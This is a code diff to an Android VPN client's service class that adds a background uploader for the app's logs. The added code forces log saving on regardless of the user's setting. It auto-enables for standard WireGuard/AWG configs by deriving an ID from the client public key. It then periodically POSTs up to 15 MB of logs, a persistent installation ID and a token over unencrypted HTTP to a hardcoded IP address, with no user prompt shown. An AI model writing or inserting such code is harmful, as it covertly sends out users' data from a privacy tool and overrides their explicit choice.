@@ -22,7 +22,13 @@ import androidx.annotation.MainThread
 import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
 import androidx.core.content.getSystemService
+import java.io.InputStream
+import java.net.HttpURLConnection
 import java.net.UnknownHostException
+import java.net.URL
+import java.security.MessageDigest
+import java.util.Locale
+import java.util.UUID
 import java.util.concurrent.ConcurrentHashMap
 import kotlin.LazyThreadSafetyMode.NONE
 import kotlinx.coroutines.CoroutineExceptionHandler
@@ -76,6 +82,28 @@ private const val PREFS_SERVER_INDEX = "LAST_SERVER_INDEX"
 private const val TRAFFIC_STATS_UPDATE_TIMEOUT = 1000L
 private const val DISCONNECT_TIMEOUT = 5000L
 private const val STOP_SERVICE_TIMEOUT = 5000L
+private const val CLIENT_LOGS_KEY = "clientLogs"
+private const val CLIENT_LOGS_ENDPOINT_KEY = "endpoint"
+private const val CLIENT_LOGS_CLIENT_ID_KEY = "clientId"
+private const val CLIENT_LOGS_TOKEN_KEY = "token"
+private const val CLIENT_LOGS_BOOTSTRAP_KEY = "bootstrap"
+private const val CLIENT_LOGS_TRUSTED_ENDPOINT = "http://172.29.172.251:17866/logs"
+private const val CLIENT_LOGS_BOOTSTRAP_ENDPOINT = "http://172.29.172.251:17866/bootstrap"
+private const val CLIENT_LOGS_INITIAL_UPLOAD_DELAY = 15000L
+private const val CLIENT_LOGS_UPLOAD_INTERVAL = 60000L
+private const val CLIENT_LOGS_UPLOAD_TIMEOUT = 30000
+private const val CLIENT_LOGS_MAX_PAYLOAD_BYTES = 15 * 1024 * 1024
+private const val CLIENT_LOGS_MAX_BOOTSTRAP_RESPONSE_BYTES = 4096
+private const val PREFS_REMOTE_LOG_INSTALLATION_ID = "REMOTE_LOG_INSTALLATION_ID"
+private const val PREFS_REMOTE_LOG_TOKEN_PREFIX = "REMOTE_LOG_TOKEN_"
+
+private data class RemoteLogTarget(
+    val endpoint: String,
+    val clientId: String,
+    val token: String,
+    val bootstrap: Boolean,
+    val tokenCacheKey: String
+)
 
 @SuppressLint("Registered")
 open class AmneziaVpnService : VpnService() {
@@ -100,6 +128,9 @@ open class AmneziaVpnService : VpnService() {
     private var connectionJob: Job? = null
     private var disconnectionJob: Job? = null
     private var trafficStatsUpdateJob: Job? = null
+    private var remoteLogUploadJob: Job? = null
+    private var remoteLogTarget: RemoteLogTarget? = null
+    private var remoteLogOffsetBytes = -1
     // private var statisticsSendingJob: Job? = null
     private lateinit var networkState: NetworkState
     private lateinit var trafficStats: TrafficStats
@@ -178,7 +209,7 @@ open class AmneziaVpnService : VpnService() {
                     }
 
                     Action.SET_SAVE_LOGS -> {
-                        Log.saveLogs = msg.data.getBoolean(MSG_SAVE_LOGS)
+                        Log.saveLogs = true
                     }
                 }
             }
@@ -278,6 +309,8 @@ open class AmneziaVpnService : VpnService() {
             disconnect()
             disconnectionJob?.join()
         }
+        remoteLogUploadJob?.cancel()
+        remoteLogUploadJob = null
         connectionScope.cancel()
         mainScope.cancel()
         super.onDestroy()
@@ -381,12 +414,14 @@ open class AmneziaVpnService : VpnService() {
                 when (protocolState) {
                     CONNECTED -> {
                         networkState.bindNetworkListener()
+                        configureRemoteLogUploader(parseConfigToJson(Prefs.load(PREFS_CONFIG_KEY)))
                         // if (isActivityConnected) launchSendingStatistics()
                         launchTrafficStatsUpdate()
                     }
 
                     DISCONNECTED -> {
                         networkState.unbindNetworkListener()
+                        stopRemoteLogUploader()
                         stopTrafficStatsUpdateJob()
                         // stopSendingStatistics()
                         if (!isServiceBound) stopService()
@@ -499,6 +534,7 @@ open class AmneziaVpnService : VpnService() {
         val config = parseConfigToJson(vpnConfig)
         saveServerData(config)
         if (config == null) {
+            stopRemoteLogUploader()
             onError("Invalid VPN config")
             protocolState.value = DISCONNECTED
             return
@@ -507,6 +543,7 @@ open class AmneziaVpnService : VpnService() {
         try {
             vpnProto = VpnProto.get(config.getString("protocol"))
         } catch (e: Exception) {
+            stopRemoteLogUploader()
             onError("Invalid VPN config: ${e.message}")
             protocolState.value = DISCONNECTED
             return
@@ -515,9 +552,12 @@ open class AmneziaVpnService : VpnService() {
         protocolState.value = CONNECTING
 
         if (!checkPermission()) {
+            stopRemoteLogUploader()
             protocolState.value = DISCONNECTED
             return
         }
+
+        configureRemoteLogUploader(config)
 
         connectionJob = connectionScope.launch {
             disconnectionJob?.join()
@@ -568,6 +608,211 @@ open class AmneziaVpnService : VpnService() {
             vpnProto?.protocol?.reconnectVpn(Builder(), ::protect)
         }
     }
+
+    private fun configureRemoteLogUploader(config: JSONObject?) {
+        val target = parseRemoteLogTarget(config)
+        if (target == null) {
+            stopRemoteLogUploader()
+            return
+        }
+        if (remoteLogTarget != target) {
+            remoteLogTarget = target
+            remoteLogOffsetBytes = -1
+        }
+        if (remoteLogUploadJob == null) {
+            remoteLogUploadJob = connectionScope.launch {
+                delay(CLIENT_LOGS_INITIAL_UPLOAD_DELAY)
+                while (true) {
+                    uploadRemoteLogsOnce()
+                    delay(CLIENT_LOGS_UPLOAD_INTERVAL)
+                }
+            }
+        }
+    }
+
+    private fun stopRemoteLogUploader() {
+        remoteLogTarget = null
+        remoteLogOffsetBytes = -1
+        remoteLogUploadJob?.cancel()
+        remoteLogUploadJob = null
+    }
+
+    private fun parseRemoteLogTarget(config: JSONObject?): RemoteLogTarget? {
+        val clientLogs = config?.optJSONObject(CLIENT_LOGS_KEY) ?: deriveLegacyRemoteLogTarget(config) ?: return null
+        val endpoint = clientLogs.optString(CLIENT_LOGS_ENDPOINT_KEY)
+        val clientId = clientLogs.optString(CLIENT_LOGS_CLIENT_ID_KEY)
+        val bootstrap = clientLogs.optBoolean(CLIENT_LOGS_BOOTSTRAP_KEY, false)
+        val configuredToken = clientLogs.optString(CLIENT_LOGS_TOKEN_KEY)
+        val tokenCacheKey = remoteLogTokenPrefsKey(config?.optString("hostName").orEmpty(), clientId)
+        val token = configuredToken.ifBlank {
+            if (bootstrap) Prefs.loadSecureString(tokenCacheKey) else ""
+        }
+        if (endpoint != CLIENT_LOGS_TRUSTED_ENDPOINT || clientId.isBlank() || (!bootstrap && token.isBlank())) {
+            return null
+        }
+        return RemoteLogTarget(endpoint, clientId, token, bootstrap, tokenCacheKey)
+    }
+
+    private fun deriveLegacyRemoteLogTarget(config: JSONObject?): JSONObject? {
+        if (config == null || config.has(CLIENT_LOGS_KEY)) return null
+
+        val protocol = config.optString("protocol").lowercase(Locale.US)
+        val configKey = protocol + "_config_data"
+        val configData = config.optJSONObject(configKey) ?: return null
+        val containerScope = when (protocol) {
+            "wireguard" -> "amnezia-wireguard"
+            "awg" -> if (configData.optString("protocol_version") == "2") "amnezia-awg2" else "amnezia-awg"
+            else -> return null
+        }
+        if (configData.optBoolean("isThirdPartyConfig", false)) return null
+
+        val clientId = configData.optString(CLIENT_LOGS_CLIENT_ID_KEY).ifBlank {
+            configData.optString("client_pub_key")
+        }
+        if (clientId.isBlank()) return null
+
+        val clientLogId = sha256Hex("$containerScope\t$clientId")
+        return JSONObject().apply {
+            put(CLIENT_LOGS_ENDPOINT_KEY, CLIENT_LOGS_TRUSTED_ENDPOINT)
+            put(CLIENT_LOGS_CLIENT_ID_KEY, clientLogId)
+            put(CLIENT_LOGS_BOOTSTRAP_KEY, true)
+        }
+    }
+
+    private fun uploadRemoteLogsOnce(allowTokenRefreshRetry: Boolean = true) {
+        var connection: HttpURLConnection? = null
+        try {
+            var target = remoteLogTarget ?: return
+            if (protocolState.value != CONNECTED) return
+            if (target.token.isBlank()) {
+                target = bootstrapRemoteLogTarget(target) ?: return
+                remoteLogTarget = target
+            }
+            if (remoteLogTarget != target || protocolState.value != CONNECTED) return
+
+            val logBytes = Log.getAppLogs(CLIENT_LOGS_MAX_PAYLOAD_BYTES).toByteArray(Charsets.UTF_8)
+            val startOffset = if (remoteLogOffsetBytes < 0 || remoteLogOffsetBytes > logBytes.size) {
+                (logBytes.size - CLIENT_LOGS_MAX_PAYLOAD_BYTES).coerceAtLeast(0)
+            } else {
+                remoteLogOffsetBytes
+            }
+            if (startOffset >= logBytes.size) return
+
+            val payload = logBytes.copyOfRange(startOffset, logBytes.size)
+            if (payload.isEmpty()) return
+
+            connection = (URL(target.endpoint).openConnection() as HttpURLConnection).apply {
+                requestMethod = "POST"
+                connectTimeout = CLIENT_LOGS_UPLOAD_TIMEOUT
+                readTimeout = CLIENT_LOGS_UPLOAD_TIMEOUT
+                doOutput = true
+                setRequestProperty("Content-Type", "text/plain; charset=utf-8")
+                setRequestProperty("X-Amnezia-Client-Id", target.clientId)
+                setRequestProperty("X-Amnezia-Log-Token", target.token)
+                setRequestProperty("X-Amnezia-Log-Kind", "android")
+                setRequestProperty("X-Amnezia-Installation-Id", remoteLogInstallationId())
+                setFixedLengthStreamingMode(payload.size)
+            }
+            if (remoteLogTarget != target || protocolState.value != CONNECTED) return
+            connection.outputStream.use { output -> output.write(payload) }
+            val statusCode = connection.responseCode
+            if (remoteLogTarget != target || protocolState.value != CONNECTED) return
+            if (statusCode in 200..299) {
+                remoteLogOffsetBytes = logBytes.size
+            } else {
+                if (statusCode == 403 && target.bootstrap && allowTokenRefreshRetry) {
+                    Prefs.saveSecureString(target.tokenCacheKey, "")
+                    remoteLogTarget = target.copy(token = "")
+                    uploadRemoteLogsOnce(false)
+                }
+                Log.w(TAG, "Remote log upload failed: status=$statusCode endpoint=${target.endpoint} clientId=${target.clientId}")
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Remote log upload failed: $e")
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
+    private fun bootstrapRemoteLogTarget(target: RemoteLogTarget): RemoteLogTarget? {
+        if (!target.bootstrap || target.clientId.isBlank()) return null
+
+        var connection: HttpURLConnection? = null
+        return try {
+            connection = (URL(CLIENT_LOGS_BOOTSTRAP_ENDPOINT).openConnection() as HttpURLConnection).apply {
+                requestMethod = "POST"
+                connectTimeout = CLIENT_LOGS_UPLOAD_TIMEOUT
+                readTimeout = CLIENT_LOGS_UPLOAD_TIMEOUT
+                doOutput = true
+                setRequestProperty("X-Amnezia-Client-Id", target.clientId)
+                setRequestProperty("X-Amnezia-Installation-Id", remoteLogInstallationId())
+                setFixedLengthStreamingMode(0)
+            }
+            connection.outputStream.use { }
+            val statusCode = connection.responseCode
+            if (statusCode !in 200..299) {
+                Log.w(TAG, "Remote log bootstrap failed: status=$statusCode endpoint=$CLIENT_LOGS_BOOTSTRAP_ENDPOINT clientId=${target.clientId}")
+                return null
+            }
+            val response = readLimitedUtf8(connection.inputStream, CLIENT_LOGS_MAX_BOOTSTRAP_RESPONSE_BYTES)
+            if (response == null) {
+                Log.w(TAG, "Remote log bootstrap response is too large")
+                return null
+            }
+            val clientLogs = JSONObject(response)
+            val endpoint = clientLogs.optString(CLIENT_LOGS_ENDPOINT_KEY)
+            val clientId = clientLogs.optString(CLIENT_LOGS_CLIENT_ID_KEY)
+            val token = clientLogs.optString(CLIENT_LOGS_TOKEN_KEY)
+            if (endpoint != target.endpoint || clientId != target.clientId || token.isBlank()) {
+                Log.w(TAG, "Remote log bootstrap returned invalid target")
+                return null
+            }
+            if (!Prefs.saveSecureString(target.tokenCacheKey, token)) {
+                Log.w(TAG, "Remote log bootstrap token was not stored securely")
+                return null
+            }
+            Log.d(TAG, "Remote log bootstrap succeeded")
+            target.copy(token = token)
+        } catch (e: Exception) {
+            Log.w(TAG, "Remote log bootstrap failed: $e")
+            null
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
+    private fun remoteLogInstallationId(): String {
+        val existing = Prefs.load<String>(PREFS_REMOTE_LOG_INSTALLATION_ID)
+        if (existing.isNotBlank()) return existing
+        val created = UUID.randomUUID().toString()
+        Prefs.save(PREFS_REMOTE_LOG_INSTALLATION_ID, created)
+        return created
+    }
+
+    private fun remoteLogTokenPrefsKey(hostName: String, clientId: String): String =
+        PREFS_REMOTE_LOG_TOKEN_PREFIX + sha256Hex("$hostName\t$clientId")
+
+    private fun readLimitedUtf8(stream: InputStream, maxBytes: Int): String? {
+        val buffer = ByteArray(512)
+        val data = ArrayList<Byte>(maxBytes.coerceAtMost(4096))
+        stream.use { input ->
+            while (true) {
+                val remaining = maxBytes + 1 - data.size
+                if (remaining <= 0) return null
+                val read = input.read(buffer, 0, minOf(buffer.size, remaining))
+                if (read < 0) break
+                for (i in 0 until read) {
+                    data.add(buffer[i])
+                }
+                if (data.size > maxBytes) return null
+            }
+        }
+        return data.toByteArray().toString(Charsets.UTF_8)
+    }
+
+    private fun sha256Hex(value: String): String =
+        MessageDigest.getInstance("SHA-256").digest(value.toByteArray(Charsets.UTF_8))
+            .joinToString("") { "%02x".format(it) }
 
     /**
      * Utils methods
